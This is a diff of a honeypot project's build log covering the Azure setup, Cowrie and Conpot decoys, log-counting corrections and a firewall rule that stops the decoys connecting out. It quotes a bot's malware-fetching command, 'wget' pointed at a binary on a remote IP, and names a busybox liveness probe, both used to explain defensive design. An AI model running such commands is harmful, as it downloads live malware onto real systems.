@@ -1,5 +1,8 @@
 # Build log
-A step-by-step record of everything I did for the setup, since tis is all configurations, no code.
+
+A step-by-step record of everything I did for the setup, since this is all
+configurations, no code.
+
 Bloopers included
 
 ## The machine
@@ -15,33 +18,36 @@ Bloopers included
 | Public IP | Static, so the address does not change mid-collection |
 | Resource group | `deception-grid` — everything is inside it, so teardown is a single step |
 
-Only one machine and both decoys sit behind the same address. This is so thtthe IT-door and 
-OT-door traffic are directly comparable. Two machines would mean two different addresses with 
-two different discovery histories, which is apples to orages.
+Only one machine, and both decoys sit behind the same address. This is so that
+the IT-door and OT-door traffic are directly comparable. Two machines would mean
+two different addresses with two different discovery histories, which is apples
+to oranges.
 
 ## Mistakes made
 
-**Hetzner abandoned.** Chosen because it waas the cheapest. It wanted my credit card details and then asked for a €25
-deposit for 'identification' (!?!), so I stopped and and looked for alternatives
+**Hetzner abandoned.** Chosen because it was the cheapest. It wanted my credit
+card details and then asked for a €25 deposit for 'identification' (!?!), so I
+stopped and looked for alternatives.
 
-**The Azure for Students "free VM" offer is Windows Server only.** I have a student email, and want to do the Azure certs as well.
-Its image list has no Linux in it, so chose Ubuntu 24.04 undert he
-*Create a virtual machine* flow. $100 free student credit.
+**The Azure for Students "free VM" offer is Windows Server only.** I have a
+student email, and want to do the Azure certs as well. Its image list has no
+Linux in it, so chose Ubuntu 24.04 under the *Create a virtual machine* flow.
+$100 free student credit.
 
-**Tried multiple regions before one worked.** Germany West Central had no B-series
-capacity. Sweden Central was refused by the subscription's own region policy.
-Austria East worked. About 40 minutes lost D':.
+**Tried multiple regions before one worked.** Germany West Central had no
+B-series capacity. Sweden Central was refused by the subscription's own region
+policy. Austria East worked. About 40 minutes lost D':.
 
 ## The admin address problem
 
 Discovered the morning after the build: SSH timed out. Nothing was wrong with
-the machine - the admin rule allows exactly one source address, and a
+the machine — the admin rule allows exactly one source address, and a
 residential connection had been given a new one overnight.
 
 The two addresses were not neighbours. They sat in unrelated ranges, which
 rules out the obvious fix of allowing the provider's block. Time to diagnose,
 knowing what to look for: about 20 minutes. "Timed out" rather than "refused"
-was the clue that mattered - a refusal means the host answered, a timeout
+was the clue that mattered — a refusal means the host answered, a timeout
 means nothing did.
 
 The choice was between three options: rewrite the rule each session, widen it
@@ -49,8 +55,8 @@ to something permanent and looser, or automate it. Automating it keeps the
 strictest version of the control and removes the operational cost that would
 eventually have argued for weakening it. See `scripts/allow-me.ps1`.
 
-A control that is expensive to comply with gets bypassed, and the bypass is 
-usually invisible until something goes wrong. Thecheapest way to keep a strict
+A control that is expensive to comply with gets bypassed, and the bypass is
+usually invisible until something goes wrong. The cheapest way to keep a strict
 rule is to make obeying it take one command.
 
 ## The decoys
@@ -99,6 +105,12 @@ scanners use to identify a decoy.
 
 Failed attempts are logged in full either way, so credential-stuffing volume
 does not depend on this choice.
+
+**One consequence to state wherever the success figure appears.** Because this
+list decides who gets in, the number of successful logins measures *this
+configuration*, not attacker skill. The five credential pairs that succeeded
+over the first four days are exactly the five in this file. The claim that does
+not depend on our choices is how many distinct sources tried one of them.
 
 ## Going live
 
@@ -158,7 +170,22 @@ first successful login  2026-09-25 08:10:04 UTC   8m44s, root/root
 
 Port 22 was separately confirmed reachable from an external address the same
 morning, so the fact that every early arrival came in on telnet is a property
-of the traffic rather than a fault in the setup. See `first-contact.md`.
+of the traffic rather than a fault in the setup. See `first-contact.md` — and
+note that the telnet-only pattern did **not** survive contact with four days of
+data; it was forty minutes of it.
+
+### The log rotates, which changes how you read it
+
+`cowrie.json` holds the current day only. Previous days roll into
+`cowrie.json.YYYY-MM-DD`. This is worth stating in a build log because not
+knowing it produced every wrong figure in the project's first week: analysis
+read the current-day file and reported it as the whole collection, so 14,845
+events and 93 sources were really one partial day out of five, against 201,349
+and 967 across all of them.
+
+Anything that reads the log must glob `cowrie.json*`, and anything that reports
+a total should print which files it read. `analysis/ingest.py` and
+`/usr/local/bin/decoy-status` both do.
 
 ## The OT decoy
 
@@ -243,7 +270,7 @@ OT door opens:
 | Listens on 5020, not 502 | The whole OT argument depends on the real Modbus port. 502 is privileged, so it needs systemd socket activation |
 | Registers answer at `40001`, `30001`, coil `1`, and return *illegal data address* at `0` | `40001` is the **documentation** convention; on the wire, holding register 40001 is address `0`. A scanner reading from zero gets only errors — lost data, and a tell, since real controllers answer low addresses |
 | Every register reads zero, unchanged over four reads in thirty seconds | `PlcScanCycle` is configured to animate them and does not. A controller whose registers never move is not controlling anything |
-| Fetches its own public address from an external service on startup | An outbound connection from the VM, which this project's scope explicitly excludes. See the correction in `rules-of-engagement.md` |
+| Fetches its own public address from an external service on startup | An outbound connection from the VM, which this project's scope explicitly excludes. See the correction in `rules-of-engagement.md`. A far larger instance of the same problem was later found in Cowrie — see *Stopping the decoys reaching out* below — and the firewall rule described there covers only the `cowrie` user, so this Conpot behaviour still has to be disabled in its configuration |
 
 Also worth changing: Conpot created its temporary filesystem inside its own
 installed package directory. `--temp_dir` should point somewhere that is not
@@ -260,8 +287,6 @@ means blending in with other honeypots rather than with real plants.
 This is a design decision about what the imaginary factory is, and it is
 deliberately not being made in a hurry.
 
-
-
 ## Known limitations
 
 **The fake user is Cowrie's default.** `/etc/passwd` in the imitation contains
@@ -273,18 +298,35 @@ more visible to a careful attacker than a default username. Fixing it properly
 means rebuilding a 1.2 MB pickle, which was not worth delaying collection for.
 Recorded rather than hidden.
 
-**The imitation is good enough to be probed, not always good enough to be
-infected.** The first successful visitor ran a complete infection sequence and
-left without delivering a payload. The likeliest reason is a failed liveness
-check — `/bin/busybox HISILICON` expects a specific busybox error string. So
-the decoy captures reconnaissance and credential behaviour reliably, and
-payload delivery only sometimes. Any claim about what attackers install here
-must be qualified accordingly.
+**The imitation held further than first thought — corrected 29 September.** An
+earlier version of this section said the decoy was "good enough to be probed,
+not always good enough to be infected", because the first successful visitor
+ran a full infection sequence and left without delivering a payload, and had
+probably failed the `/bin/busybox HISILICON` liveness check. Four days of data
+contradict both halves. That check was **accepted 1,471 times**, and 33 sessions
+did fetch a payload — 81 successful fetches, 33 distinct files, from 8 hosts.
+The only commands ever rejected were `enable`, `shell` and `system`, which are
+router words absent from the emulated shell; `sh`, busybox, the injection probe
+and the writable-directory hunt were all accepted.
+
+What the dataset genuinely cannot support is a claim about what attackers *run*,
+because nothing is ever executed. See `first-contact.md` for the stage counts.
+
+**Counts are not comparable unless you know what the rows are.** Five separate
+figures in this project were wrong for the same reason — an aggregate reported
+before anyone looked at the rows behind it. Two cases worth knowing about before
+reading any number here: `cowrie.session.file_download` covers three different
+things (a network fetch, an SCP push, and a captured shell redirection) and only
+those with a `url` field are fetches; and an event count per port is not an
+arrival count, which overstated arrivals roughly fivefold. Details in
+`rules-of-engagement.md` and `first-contact.md`.
 
 **Loopback and the analyst's own address are in the log.** Local testing on
 25 September produced sessions from `127.0.0.1`, and the external port-22
 check produced one from the analyst's home address. Both are excluded at
 ingest, and the exclusion is stated in the write-up rather than done quietly.
+The analyst's addresses change, so `analysis/exclude-ips.txt` is a list on the
+sensor that is topped up each time — see `analysis/exclude-ips.txt.example`.
 
 **`dst_ip` is the private address.** Azure translates, so every log line shows
 `172.16.0.4` rather than the public address. Identify the sensor by the
@@ -305,8 +347,8 @@ ingest, and the exclusion is stated in the write-up rather than done quietly.
 7. Host firewall: `ufw default deny incoming`, `ufw allow 62222/tcp`.
 
 Then, before closing anything: opened a **third** shell on 62222 from scratch
-and confirmed it logged in. Lesson learnt: Never close a working session till 
-the new one is confirmed to work
+and confirmed it logged in. Lesson learnt: never close a working session till
+the new one is confirmed to work.
 
 ## The near-lockout, or trust no one
 
@@ -326,8 +368,8 @@ Over IPv4 — the only way I actually reach the machine — nothing was answerin
 Port 22 was about to be shut. Closing that session would have made the server
 unreachable with no console fallback configured.
 
-Caught it by being paranoid and reading the `ss` output instead of assuming 
-the restart had worked. Tip: name both address families expicitly:
+Caught it by being paranoid and reading the `ss` output instead of assuming
+the restart had worked. Tip: name both address families explicitly:
 
 ```
 [Socket]
@@ -347,10 +389,10 @@ closing anything.
 - **ufw** (on the machine): *what* it will answer. Default deny, with only the
   ports that have a reason to be open.
 
-A misconfiguration in one still leaves the other oneso, each decoy port has 
-to be opened in **both** layers. Cowrie on 22 and 23, Conpot on 502 — a rule 
-at Azure *and* a `ufw allow`. Forgetting the second is the most likely reason
-that a decoy would look dead when it is running fine. Check here first
+A misconfiguration in one still leaves the other, so each decoy port has to be
+opened in **both** layers. Cowrie on 22 and 23, Conpot on 502 — a rule at Azure
+*and* a `ufw allow`. Forgetting the second is the most likely reason that a
+decoy would look dead when it is running fine. Check here first.
 
 ## Stopping the decoys reaching out
 
@@ -364,9 +406,19 @@ Cowrie's `wget`, `curl` and `tftp` are not simulations. When a bot types
 `wget http://45.32.215.222/iran.mips`, Cowrie fetches that file for real and
 stores it under its SHA-256 in `var/lib/cowrie/downloads/`. That is how
 honeypots collect malware samples and it is on by default. Between 25 and
-29 September 2026 it produced 259 successful downloads and 72 failures — 331
-outbound connections — and 104 samples totalling 74 MB. Full account in
-`docs/rules-of-engagement.md` under *The outbound download problem*.
+29 September 2026 it produced **81 successful fetches and 72 failures — 153
+outbound connections to 8 distinct hosts** — and 33 distinct fetched files. Full
+account in `docs/rules-of-engagement.md` under *The outbound download problem*,
+including why the first version of this figure said 259 and 331.
+
+The count matters for what the rule has to cover, so it is worth being exact
+about what was counted. Cowrie records three different things under the single
+event name `cowrie.session.file_download`, and only one of them is a network
+fetch: the discriminator is whether the event carries a `url`. Files pushed in
+over SCP and the output of captured shell redirections have no `url`, are
+inbound, and are unaffected by this rule — they are what the sensor is for.
+Anyone reproducing this build and measuring its outbound traffic should filter on
+`url` before quoting a number.
 
 ### Why not in `cowrie.cfg`
 
@@ -389,10 +441,10 @@ In `/etc/ufw/before.rules`, immediately after the existing
 # Deception Grid: the decoys must never initiate an outbound connection.
 # Cowrie emulates wget, curl and tftp by actually fetching the file an
 # attacker names, which means connecting to attacker-controlled hosts.
-# 259 such downloads happened between 25 and 29 September 2026 before it
-# was noticed. Replies to attackers are ESTABLISHED and accepted by the
-# rule above; only connections the cowrie user starts are rejected.
-# uid 1001 = cowrie.
+# 81 such fetches happened between 25 and 29 September 2026 before it was
+# noticed, in 153 outbound connection attempts. Replies to attackers are
+# ESTABLISHED and accepted by the rule above; only connections the cowrie
+# user starts are rejected. uid 1001 = cowrie.
 -A ufw-before-output -m owner --uid-owner 1001 -j REJECT --reject-with icmp-port-unreachable
 ```
 
@@ -443,6 +495,21 @@ sudo iptables -F dgtest
 sudo iptables -X dgtest
 ```
 
+### Watch that it stays in place
+
+`decoy-status` checks two things on every run: that the rule is still present in
+`ufw-before-output`, and that no url-bearing fetch event has appeared since the
+block went in. The second is the one that matters, because a rule can be present
+and ineffective.
+
+Do **not** watch this by counting files in `var/lib/cowrie/downloads/`. A first
+version of the check did exactly that, against a baseline, and raised a false
+alarm within the hour. That directory is not "downloads": attacker-pushed files
+and captured shell redirections land there too, and keep landing whether or not
+outbound is blocked, so the count rises forever. Redirection captures are also
+named `redir_<uuid>` rather than by hash, so the file count exceeds the amount of
+distinct content — 106 files against 65 distinct hashes on 29 September.
+
 ### What still gets captured
 
 Cowrie logs `cowrie.session.file_download.failed` with the URL it was told to
@@ -468,12 +535,17 @@ rule. **Re-check it after any `ufw` or kernel upgrade**, with the
   honeypot, instead of the background traffic of the internet. That would make
   the findings worth less. The address is in my notes, not in git.
 - **The SSH private key**, which has never left the laptop that generated it.
+- **The analyst's address list**, `analysis/exclude-ips.txt`. It is a record of
+  one person's home IP addresses over time. `analysis/exclude-ips.txt.example`
+  documents the format and the top-up command without the values.
 - Anything uploaded to the decoys — see `.gitignore`. Much of it is live
-  malware, and since it becomes live immediately, .gitignore had to be configured first.
+  malware, and since it becomes live immediately, `.gitignore` had to be
+  configured first.
 
 ## Teardown
 
-Delete the resource group `deception-grid` — that contains the
-VM, disk, IP and network rules together, which is why they were all put in one
-group to begin with. The results database has to have been copied off the machine first,
-committed here, and the copy confirmed to open. Scheduled for after demoo day, so 12 December 2026.
+Delete the resource group `deception-grid` — that contains the VM, disk, IP and
+network rules together, which is why they were all put in one group to begin
+with. The results database has to have been copied off the machine first,
+committed here, and the copy confirmed to open. Scheduled for after demo day, so
+12 December 2026.
